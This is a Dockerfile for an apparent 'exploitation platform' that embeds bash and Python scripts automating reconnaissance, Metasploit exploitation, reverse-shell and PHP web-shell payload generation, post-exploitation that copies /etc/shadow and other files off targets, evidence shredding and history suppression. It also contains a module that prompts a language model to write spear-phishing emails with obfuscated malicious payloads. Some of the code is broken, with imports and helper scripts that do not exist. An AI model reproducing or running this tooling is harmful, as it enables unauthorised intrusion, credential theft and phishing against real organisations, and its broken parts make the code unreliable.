# Ultimate Professional Exploitation Platform
FROM kalilinux/kali-rolling:latest

LABEL maintainer="red-team@example.com" \
      version="2025.08-advanced" \
      description="Enterprise-Grade Penetration Testing & Exploitation Platform"

# 1. Install comprehensive toolset with cloud/AD/exploit frameworks
RUN set -euo pipefail && \
    apt-get update && \
    DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \
    git jq dos2unix python3-pip python3-venv\
    metasploit-framework exploitdb bloodhound \
    crackmapexec powersploit impacket-scripts \
    nuclei eyewitness wafw00f cloudmapper \
    golang nodejs npm\
    awscli gcloud-sdk azure-cli \
    amass subfinder naabu httpx && \
    apt-get clean && rm -rf /var/lib/apt/lists/* \

RUN  pip3 install --break-system-packages --no-cache-dir \
    mitm6 dnspython xsshunter \
    commix sqlmap bs4 requests \
    playwright-stealth pwntools && \
    python3 -m playwright install --with-deps chromium firefox

# 2. Install specialized security tools
RUN git clone --depth 1 https://github.com/danielmiessler/SecLists.git /usr/share/seclists && \
    git clone --depth 1 https://github.com/projectdiscovery/nuclei-templates.git /root/nuclei-templates && \
    git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git /opt/payloads-all-the-things && \
    go install -v github.com/projectdiscovery/katana/cmd/katana@latest && \
    go install -v github.com/projectdiscovery/notify/cmd/notify@latest && \
    go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest && \
    ln -s /root/go/bin/* /usr/local/bin/

# 3. Configure environments
ENV PLAYWRIGHT_BROWSERS_PATH=/usr/bin
RUN mkdir -p /scripts /reports /wordlists /exploits /loot && \
    playwright install chromium firefox && \
    nuclei -update-templates && \
    msfdb init

# 4. Enhanced common functions library
RUN cat << 'EOF' > /scripts/common.sh
#!/usr/bin/env bash
set -euo pipefail

# Vulnerability severity classification
declare -A SEVERITY_COLORS=(
    [CRITICAL]="\033[0;31m"
    [HIGH]="\033[0;35m"
    [MEDIUM]="\033[0;33m"
    [LOW]="\033[0;34m"
    [INFO]="\033[0;32m"
    [DEBUG]="\033[0;36m"
)

log() {
    local level="${1:-INFO}"
    local message="${2:-}"
    local color="${SEVERITY_COLORS[$level]:-\033[0m}"

    if [[ -t 1 ]]; then
        echo -e "${color}[$level] $message\033[0m"
    else
        echo "[$level] $message"
    fi
}

die() {
    log CRITICAL "$*" >&2
    exit 1
}

validate_url() {
    [[ "$1" =~ ^https?://.+ ]] || die "Invalid URL '$1'. Must start with http:// or https://"
}

parse_nmap_xml() {
    local xml_file="$1"
    python3 -c "
import xml.etree.ElementTree as ET
tree = ET.parse('$xml_file')
root = tree.getroot()
for host in root.findall('host'):
    ip = host.find('address').get('addr')
    for port in host.findall('ports/port'):
        portid = port.get('portid')
        state = port.find('state').get('state')
        service = port.find('service').get('name') if port.find('service') is not None else 'unknown'
        version = port.find('service').get('version') if port.find('service') is not None else ''
        print(f'{ip}:{portid}|{state}|{service}|{version}')
    "
}

cve_lookup() {
    local service="$1"
    local version="$2"
    searchsploit -j --cve "$service $version" | jq -r '.RESULTS_EXPLOIT[] | .Title + "|" + .Path' |
sort -u
}

cloud_recon() {
    local domain="$1"
    local output_dir="$2"

    if [[ "$domain" =~ .*amazonaws\.com ]]; then
        log INFO "Starting AWS reconnaissance"
        aws sts get-caller-identity > "$output_dir/aws_identity.json"
        aws ec2 describe-instances > "$output_dir/aws_ec2_instances.json"
        cloudmapper collect --account "$domain" > "$output_dir/cloudmapper_collect.log"
        cloudmapper audit --json > "$output_dir/cloud_audit.json"
    elif [[ "$domain" =~ .*googlecloud\.com ]]; then
        log INFO "Starting GCP reconnaissance"
        gcloud config list --format=json > "$output_dir/gcp_config.json"
        gcloud projects list --format=json > "$output_dir/gcp_projects.json"
    elif [[ "$domain" =~ .*azure\.com ]]; then
        log INFO "Starting Azure reconnaissance"
        az account show > "$output_dir/azure_account.json"
        az vm list > "$output_dir/azure_vms.json"
    fi
}

generate_payload() {
    local exploit_type="$1"
    local output_file="$2"

    case "$exploit_type" in
        windows)
            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f exe -o
"$output_file" >/dev/null
            ;;
        linux)
            msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f elf -o
"$output_file" >/dev/null
            ;;
        web)
            echo "<?php system(\$_REQUEST['cmd']); ?>" > "$output_file"
            ;;
        *)
            log ERROR "Unknown payload type: $exploit_type"
            return 1
            ;;
    esac
}
EOF

# 5. Cloud and Active Directory Reconnaissance Module
RUN cat << 'EOF' > /scripts/cloud_ad_recon.sh
#!/usr/bin/env bash
set -euo pipefail
source /scripts/common.sh

TARGET_DOMAIN="" OUTPUT_DIR=""

while getopts "d:o:h" opt; do
    case $opt in
        d) TARGET_DOMAIN="$OPTARG";;
        o) OUTPUT_DIR="$OPTARG";;
        h) show_help;;
        *) show_help;;
    esac
done

[[ -z "${TARGET_DOMAIN:-}" ]] && die "Target domain required (-d)"
[[ -z "${OUTPUT_DIR:-}" ]] && die "Output directory required (-o)"

mkdir -p "$OUTPUT_DIR"

log INFO "Starting comprehensive reconnaissance for $TARGET_DOMAIN"

# Passive reconnaissance
amass enum -passive -d "$TARGET_DOMAIN" -o "$OUTPUT_DIR/amass_passive.txt"
subfinder -d "$TARGET_DOMAIN" -o "$OUTPUT_DIR/subfinder.txt"

# Active reconnaissance
naabu -list "$OUTPUT_DIR/subfinder.txt" -o "$OUTPUT_DIR/naabu_scan.txt"
httpx -list "$OUTPUT_DIR/naabu_scan.txt" -o "$OUTPUT_DIR/httpx_results.json"

# Cloud environment detection
cloud_recon "$TARGET_DOMAIN" "$OUTPUT_DIR"

# Active Directory checks
if grep -q "88/tcp" "$OUTPUT_DIR/naabu_scan.txt"; then
    log MEDIUM "Kerberos port detected, starting AD reconnaissance"
    crackmapexec smb "$TARGET_DOMAIN" --users > "$OUTPUT_DIR/ad_users.txt"
    crackmapexec smb "$TARGET_DOMAIN" --groups > "$OUTPUT_DIR/ad_groups.txt"
    crackmapexec smb "$TARGET_DOMAIN" --pass-pol >
"$OUTPUT_DIR/ad_password_policy.txt"

    # Bloodhound collection
    bloodhound-python -d "$TARGET_DOMAIN" -u "anonymous" -p "" -ns
"DOMAIN_CONTROLLER_IP" -c All > "$OUTPUT_DIR/bloodhound_collect.log"
fi

log HIGH "Reconnaissance completed for $TARGET_DOMAIN"
EOF

# 6. Advanced Exploitation Engine
RUN cat << 'EOF' > /scripts/exploit_engine.py
#!/usr/bin/env python3
import os
import json
import subprocess
from scripts.common import log

class ExploitEngine:
    def __init__(self, recon_data, output_dir):
        self.recon_data = recon_data
        self.output_dir = output_dir
        self.exploit_results = {}

    def run_msf_exploit(self, module, rhost, payload_options=None):
        try:
            log("INFO", f"Executing Metasploit module: {module}")
            cmd = f"msfconsole -q -x 'use {module}; set RHOSTS {rhost};"

            if payload_options:
                for opt, value in payload_options.items():
                    cmd += f" set {opt} {value};"

            cmd += " run; exit'"
            result = subprocess.check_output(cmd, shell=True, text=True)

            output_path = os.path.join(self.output_dir, f"{module.replace('/', '_')}.txt")
            with open(output_path, 'w') as f:
                f.write(result)

            if "Command Stager progress" in result or "Meterpreter session" in result:
                self.exploit_results[module] = "SUCCESS"
                return True
        except Exception as e:
            log("ERROR", f"Exploit failed: {str(e)}")
        return False

    def execute_web_exploit(self, vulnerability, target_url):
        if vulnerability == "SQLi":
            log("MEDIUM", "Launching advanced SQL injection")
            subprocess.run([
                "/scripts/sql_test.sh",
                "-u", target_url,
                "-o", os.path.join(self.output_dir, "sqli"),
                "-e", "advanced"
            ])
        elif vulnerability == "XSS":
            log("MEDIUM", "Launching XSS exploitation")
            subprocess.run([
                "python3", "/scripts/xss_exploit.py",
                "-u", target_url,
                "-o", os.path.join(self.output_dir, "xss_results.txt")
            ])
        elif vulnerability == "RCE":
            log("HIGH", "Attempting remote code execution")
            # Custom RCE exploit logic would go here
            with open(os.path.join(self.output_dir, "rce_attempt.txt"), 'w') as f:
                f.write(f"RCE exploitation attempted against {target_url}")

    def cloud_exploit(self, provider, config):
        if provider == "aws":
            log("HIGH", "Checking for AWS misconfigurations")
            # Check for public S3 buckets
            s3_output = os.path.join(self.output_dir, "s3_buckets.txt")
            subprocess.run(f"aws s3 ls > {s3_output}", shell=True)

            # Check for exposed resources
            with open(s3_output, 'r') as f:
                for bucket in f.readlines():
                    bucket_name = bucket.split()[-1]
                    subprocess.run(f"aws s3api get-bucket-acl --bucket {bucket_name} >>
{self.output_dir}/s3_acls.txt", shell=True)

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Advanced Exploitation Engine")
    parser.add_argument('-d', '--data', required=True, help='Recon data JSON file')
    parser.add_argument('-o', '--output', required=True, help='Output directory')
    args = parser.parse_args()

    with open(args.data, 'r') as f:
        recon_data = json.load(f)

    engine = ExploitEngine(recon_data, args.output)

    # Example exploitation logic
    if 'vulnerable_services' in recon_data:
        for service in recon_data['vulnerable_services']:
            if 'Apache' in service and 'CVE-2021-41773' in service:
                engine.run_msf_exploit(
                    "exploit/linux/http/apache_normalize_path_rce",
                    recon_data['target_ip'],
                    {"PAYLOAD": "linux/x64/meterpreter/reverse_tcp"}
                )

    log("INFO", "Exploitation process completed")
EOF

# 7. Advanced Post-Exploitation Framework
RUN cat << 'EOF' > /scripts/post_exploit_framework.py
#!/usr/bin/env python3
import os
import sys
import paramiko
import requests
from scripts.common import log

class PostExploiter:
    def __init__(self, target, creds, access_type, output_dir):
        self.target = target
        self.creds = creds
        self.access_type = access_type
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    def execute_command(self, cmd):
        try:
            if self.access_type == "ssh":
                with paramiko.SSHClient() as ssh:
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(self.target, **self.creds)
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    return stdout.read().decode()

            elif self.access_type == "webshell":
                url = f"{self.target}/cmd.php?cmd={cmd}"
                return requests.get(url, timeout=10).text

            elif self.access_type == "winrm":
                # Placeholder for WinRM access
                return f"Executed {cmd} via WinRM"

        except Exception as e:
            log("ERROR", f"Command execution failed: {str(e)}")
            return ""

    def system_recon(self):
        log("INFO", "Starting system reconnaissance")
        results = {
            "system_info": self.execute_command("uname -a"),
            "users": self.execute_command("cat /etc/passwd"),
            "processes": self.execute_command("ps aux"),
            "network": self.execute_command("ifconfig || ip addr")
        }

        for name, content in results.items():
            with open(os.path.join(self.output_dir, f"{name}.txt"), 'w') as f:
                f.write(content)

    def privilege_escalation(self):
        log("MEDIUM", "Checking privilege escalation vectors")
        checks = {
            "suid": "find / -perm -4000 2>/dev/null",
            "sudo": "sudo -l",
            "capabilities": "getcap -r / 2>/dev/null",
            "cron": "crontab -l"
        }

        for name, cmd in checks.items():
            output = self.execute_command(cmd)
            with open(os.path.join(self.output_dir, f"priv_esc_{name}.txt"), 'w') as f:
                f.write(output)

    def data_exfiltration(self, paths):
        log("HIGH", "Attempting data exfiltration")
        for path in paths:
            if self.access_type == "ssh":
                with paramiko.SSHClient() as ssh:
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(self.target, **self.creds)

                    with ssh.open_sftp() as sftp:
                        try:
                            sftp.get(path, os.path.join(self.output_dir, os.path.basename(path)))
                        except:
                            log("ERROR", f"Failed to exfiltrate {path}")
            else:
                content = self.execute_command(f"cat {path}")
                with open(os.path.join(self.output_dir, os.path.basename(path)), 'w') as f:
                    f.write(content)

    def lateral_movement(self, network_range):
        log("CRITICAL", "Attempting lateral movement")
        # This would be expanded with tools like crackmapexec
        with open(os.path.join(self.output_dir, "lateral_movement.txt"), 'w') as f:
            f.write(f"Lateral movement attempted to {network_range}")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Advanced Post-Exploitation Framework")
    parser.add_argument('-t', '--target', required=True)
    parser.add_argument('-c', '--creds', help='Credentials in user:pass format')
    parser.add_argument('-a', '--access', required=True, choices=['ssh', 'webshell', 'winrm'])
    parser.add_argument('-o', '--output', required=True)
    args = parser.parse_args()

    creds = {}
    if args.creds:
        username, password = args.creds.split(':', 1)
        creds = {'username': username, 'password': password}

    exploiter = PostExploiter(args.target, creds, args.access, args.output)
    exploiter.system_recon()
    exploiter.privilege_escalation()
    exploiter.data_exfiltration(["/etc/passwd", "/etc/shadow", "/var/log/auth.log"])
    exploiter.lateral_movement("192.168.1.0/24")

    log("HIGH", "Post-exploitation activities completed")
EOF

# 8. Professional Reporting Module
RUN cat << 'EOF' > /scripts/report_generator.py
#!/usr/bin/env python3
import os
import json
import glob
from jinja2 import Environment, FileSystemLoader

class ReportGenerator:
    def __init__(self, scan_dir, output_file):
        self.scan_dir = scan_dir
        self.output_file = output_file
        self.findings = []

    def parse_results(self):
        # Parse Nmap results
        nmap_files = glob.glob(f"{self.scan_dir}/**/nmap.xml", recursive=True)
        for f in nmap_files:
            self.findings.append({
                "type": "service",
                "severity": "INFO",
                "title": "Network Scan Results",
                "file": f
            })

        # Parse vulnerability findings
        vuln_files = glob.glob(f"{self.scan_dir}/**/*vuln*.json", recursive=True)
        for f in vuln_files:
            with open(f) as vf:
                for vuln in json.load(vf):
                    self.findings.append({
                        "type": "vulnerability",
                        "severity": vuln.get('severity', 'MEDIUM'),
                        "title": vuln.get('name', 'Unknown Vulnerability'),
                        "description": vuln.get('description', ''),
                        "file": f
                    })

        # Add exploitation results
        exploit_files = glob.glob(f"{self.scan_dir}/**/exploit_*.txt", recursive=True)
        for f in exploit_files:
            self.findings.append({
                "type": "exploitation",
                "severity": "HIGH",
                "title": "Successful Exploitation",
                "file": f
            })

    def generate_html(self):
        env = Environment(loader=FileSystemLoader('/scripts/templates'))
        template = env.get_template('professional_report.html')

        with open(self.output_file, 'w') as f:
            f.write(template.render(
                findings=self.findings,
                summary=f"Penetration Test Report - {len(self.findings)} Findings"
            ))

    def generate_pdf(self):
        # Placeholder for PDF generation
        pass

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Professional Report Generator")
    parser.add_argument('-i', '--input-dir', required=True)
    parser.add_argument('-o', '--output', required=True)
    parser.add_argument('-f', '--format', choices=['html', 'pdf'], default='html')
    args = parser.parse_args()

    generator = ReportGenerator(args.input_dir, args.output)
    generator.parse_results()

    if args.format == 'html':
        generator.generate_html()
    else:
        generator.generate_pdf()

    print(f"Report generated at {args.output}")
EOF

# 9. AI-Assisted Attack Module (Conceptual)
RUN cat << 'EOF' > /scripts/ai_assist.py
#!/usr/bin/env python3
import openai
import os
from scripts.common import log

class AIAttackAssistant:
    def __init__(self, api_key):
        openai.api_key = api_key
        self.context = []

    def analyze_vulnerability(self, vulnerability_data):
        prompt = f"""
        As a professional penetration tester, analyze the following vulnerability:
        {vulnerability_data}

        Suggest:
        1. Three possible exploitation methods
        2. Two potential post-exploitation actions
        3. One novel attack vector
        """

        response = openai.ChatCompletion.create(
            model="gpt-4-turbo",
            messages=[
                {"role": "system", "content": "You are an expert penetration tester"},
                {"role": "user", "content": prompt}
            ],
            max_tokens=500
        )

        return response.choices[0].message['content']

    def generate_social_engineering_payload(self, target_info):
        prompt = f"""
        Create a spear-phishing email targeting:
        Company: {target_info.get('company', 'Unknown')}
        Industry: {target_info.get('industry', 'Technology')}

        Include:
        - Persuasive pretext
        - Credible sender identity
        - Convincing call-to-action
        - Obfuscated malicious payload
        """

        response = openai.ChatCompletion.create(
            model="gpt-4-turbo",
            messages=[
                {"role": "system", "content": "You are a social engineering expert"},
                {"role": "user", "content": prompt}
            ],
            max_tokens=300
        )

        return response.choices[0].message['content']

    def suggest_exploit_chaining(self, scan_results):
        prompt = f"""
        Given these scan results:
        {scan_results}

        Propose an attack chain with:
        1. Initial access vector
        2. Two privilege escalation methods
        3. Lateral movement strategy
        4. Data exfiltration technique
        """

        response = openai.ChatCompletion.create(
            model="gpt-4-turbo",
            messages=[
                {"role": "system", "content": "You are a red team strategist"},
                {"role": "user", "content": prompt}
            ],
            max_tokens=400
        )

        return response.choices[0].message['content']

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="AI-Assisted Attack Module")
    parser.add_argument('-a', '--api-key', required=True)
    parser.add_argument('-v', '--vuln-data', help='Vulnerability data file')
    args = parser.parse_args()

    assistant = AIAttackAssistant(args.api_key)

    if args.vuln_data:
        with open(args.vuln_data) as f:
            vuln_data = f.read()
        print(assistant.analyze_vulnerability(vuln_data))
EOF

# 10. Main Orchestrator with Adaptive Attack Chaining
RUN cat << 'EOF' > /scripts/orchestrator.sh
#!/usr/bin/env bash
set -euo pipefail
source /scripts/common.sh

TARGET="" OUTPUT_DIR="" MODE="full"

while getopts "t:o:m:h" opt; do
    case $opt in
        t) TARGET="$OPTARG";;
        o) OUTPUT_DIR="$OPTARG";;
        m) MODE="$OPTARG";;
        h) show_help;;
        *) show_help;;
    esac
done

[[ -z "${TARGET}" ]] && die "Target required (-t)"
[[ -z "${OUTPUT_DIR}" ]] && die "Output directory required (-o)"

mkdir -p "$OUTPUT_DIR"
ulimit -Sv 3000000  # 3GB memory limit

# Phase 1: Comprehensive Reconnaissance
log "INFO" "Starting Phase 1: Reconnaissance"
/scripts/cloud_ad_recon.sh -d "$TARGET" -o "$OUTPUT_DIR/recon"

# Phase 2: Vulnerability Mapping
log "INFO" "Starting Phase 2: Vulnerability Mapping"
nuclei -l "$OUTPUT_DIR/recon/httpx_results.json" -t /root/nuclei-templates \
    -o "$OUTPUT_DIR/vulnerabilities.json" -severity medium,critical -j

# Phase 3: Adaptive Exploitation
log "HIGH" "Starting Phase 3: Exploitation"
if jq -e 'select(.severity == "critical")' "$OUTPUT_DIR/vulnerabilities.json" >/dev/null; then
    log "CRITICAL" "Critical vulnerabilities found, launching advanced exploits"
    python3 /scripts/exploit_engine.py \
        -d "$OUTPUT_DIR/recon/recon_data.json" \
        -o "$OUTPUT_DIR/exploits"
else
    log "MEDIUM" "No critical vulnerabilities found, running standard exploits"
    /scripts/sql_test.sh -u "$TARGET" -o "$OUTPUT_DIR/exploits/sqli"
    python3 /scripts/xss_exploit.py -u "$TARGET" -o "$OUTPUT_DIR/exploits/xss"
fi

# Phase 4: Post-Exploitation
if [ -f "$OUTPUT_DIR/exploits/successful_exploits.txt" ]; then
    log "CRITICAL" "Starting Phase 4: Post-Exploitation"
    python3 /scripts/post_exploit_framework.py \
        -t "$TARGET" \
        -a webshell \
        -o "$OUTPUT_DIR/post_exploit"
fi

# Phase 5: Reporting
log "INFO" "Starting Phase 5: Reporting"
python3 /scripts/report_generator.py \
    -i "$OUTPUT_DIR" \
    -o "$OUTPUT_DIR/final_report.html" \
    -f html

# Phase 6: Cleanup (OpSec)
log "INFO" "Starting Phase 6: Cleanup"
find "$OUTPUT_DIR" -type f -name '*pass*' -exec shred -u {} \;
rm -f "$OUTPUT_DIR"/**/credentials.*
log "INFO" "Operational security cleanup completed"

log "HIGH" "Penetration test completed successfully"
EOF

# 11. Final setup and hardening
RUN chmod +x /scripts/*.sh /scripts/*.py && \
    dos2unix /scripts/* && \
    python3 -m playwright install chromium firefox && \
    nuclei -update-templates && \
    msfdb init && \
    mkdir -p /scripts/templates

# Add professional report template
RUN cat << 'EOF' > /scripts/templates/professional_report.html
<!DOCTYPE html>
<html>
<head>
    <title>Professional Penetration Test Report</title>
    <style>
        /* Professional report styles */
        body { font-family: Arial, sans-serif; }
        .critical { color: #ff0000; font-weight: bold; }
        .high { color: #ff6600; }
        .medium { color: #ffcc00; }
        .low { color: #3366ff; }
        .info { color: #339933; }
        table { width: 100%; border-collapse: collapse; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
    </style>
</head>
<body>
    <h1>Penetration Test Report</h1>
    <h2>Executive Summary</h2>
    <p>Test conducted against {{target}} on {{date}}</p>

    <h2>Findings Overview</h2>
    <table>
        <tr>
            <th>Severity</th>
            <th>Count</th>
        </tr>
        {% set counts = {'CRITICAL':0, 'HIGH':0, 'MEDIUM':0, 'LOW':0, 'INFO':0} %}
        {% for finding in findings %}
            {% if counts.update({finding.severity: counts[finding.severity] + 1}) %} {% endif %}
        {% endfor %}
        {% for level, count in counts.items() %}
            <tr>
                <td class="{{level|lower}}">{{level}}</td>
                <td>{{count}}</td>
            </tr>
        {% endfor %}
    </table>

    <h2>Detailed Findings</h2>
    {% for finding in findings %}
        <div class="finding">
            <h3 class="{{finding.severity|lower}}">{{finding.title}} [{{finding.severity}}]</h3>
            <p>{{finding.description}}</p>
            <p>Evidence: {{finding.file}}</p>
        </div>
    {% endfor %}

    <h2>Recommendations</h2>
    <ul>
        <li>Patch critical vulnerabilities within 24 hours</li>
        <li>Implement WAF rules to block exploitation attempts</li>
        <li>Conduct security awareness training</li>
    </ul>
</body>
</html>
EOF

# Security hardening
RUN echo "unset HISTFILE" >> /etc/bash.bashrc && \
    echo "export HISTCONTROL=ignorespace" >> /etc/bash.bashrc && \
    echo "alias msfconsole='msfconsole -q'" >> /etc/bash.bashrc && \
    mkdir -p /root/.msf4 && \
    echo "production: true" > /root/.msf4/config && \
    echo "setg ConsoleLogging true" > /root/.msf4/msfconsole.rc

# Entrypoint
RUN echo -e '#!/bin/sh\nexec /bin/bash /scripts/orchestrator.sh "$@"' > /entrypoint.sh && \
    chmod +x /entrypoint.sh && \
    dos2unix /entrypoint.sh

WORKDIR /scripts
VOLUME ["/reports", "/loot"]
ENTRYPOINT ["/bin/sh", "/entrypoint.sh"]
CMD ["-h"]